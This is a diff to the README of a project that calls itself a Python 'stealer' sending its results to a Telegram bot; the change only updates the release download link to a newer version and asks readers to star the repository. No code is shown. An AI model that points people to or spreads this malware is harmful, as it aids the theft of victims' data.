@@ -9,7 +9,7 @@
 
 
 Stealer written on Python, results will be sent to Telegram bot.
-[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v6.0.3)
+[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v6.0.4)
 
 ⭐Please, star this repo if it was helpful⭐
 
